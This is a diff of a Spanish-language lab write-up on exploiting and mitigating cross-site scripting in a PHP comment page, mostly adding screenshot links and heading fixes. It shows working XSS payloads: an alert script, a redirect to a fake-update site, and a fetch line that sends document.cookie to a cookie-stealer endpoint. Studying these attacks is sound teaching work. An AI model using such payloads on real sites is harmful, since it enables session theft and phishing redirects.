@@ -6,6 +6,10 @@ En esta documentación se realiza la **Explotación y Mitigación de Cross-Site 
 
 ## 2.1 Código vulnerable
 
+A continuación se muestra el contenido del archivo comment.php que es vulnberable.
+
+![PHP](./images/apartado_dos/commentphp.png)
+
 **`comment.php`**
 ```
 <?php
@@ -45,32 +49,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </body>
 </html>
 ```
-
--  Muestra de mi fichero docker
-
-
-![DOCKER](./images/apartado_uno/xdockercompose.png)
-
 ---
 
 ### 2.1.1 Explotación 1 - XSS clásico
-**Vulnerabilidad analizada**
+
+A continuación se muestra la explotación 1.
+
+![XPLOIT1](./images/apartado_dos/xploit1.png)
+
 ```
 <script>alert('Vulnerabilidad XSS!')</script>
 <h2 style="color:red;">Explotación 1</h2>
 ```
 ---
 
-## 2.1.2 Explotación 2 - Redirección maliciosa
+### 2.1.2 Explotación 2 - Redirección maliciosa
+
+A continuación se muestra la explotación 2.
+
+![XPLOIT2](./images/apartado_dos/xploit2.png)
 
 ```
 <script>window.location='https://fakeupdate.net/win10ue/'</script>
 <h2 style="color:red;">Explotación 2</h2>
 ```
 ---
-## 2.1.3 Explotación 3 - Robo de cookies (Cookie Stealing)
 
-**`./www/cookieStealer/index.php`**
+### 2.1.3 Explotación 3 - Robo de cookies (Cookie Stealing)
+
+A continuación se muestra la explotación 3 **`./www/cookieStealer/index.php`**.
+
+![XPLOIT3](./images/apartado_dos/xploit3.png)
+
 ```
 <?php
 // Obtener la fecha actual
@@ -116,6 +126,7 @@ fetch("http://localhost/cookieStealer/index.php?cookie=" + document.cookie);
 
 ```
 ---
+
 ## 2.2 Mitigación
 
 **`comment.php`**
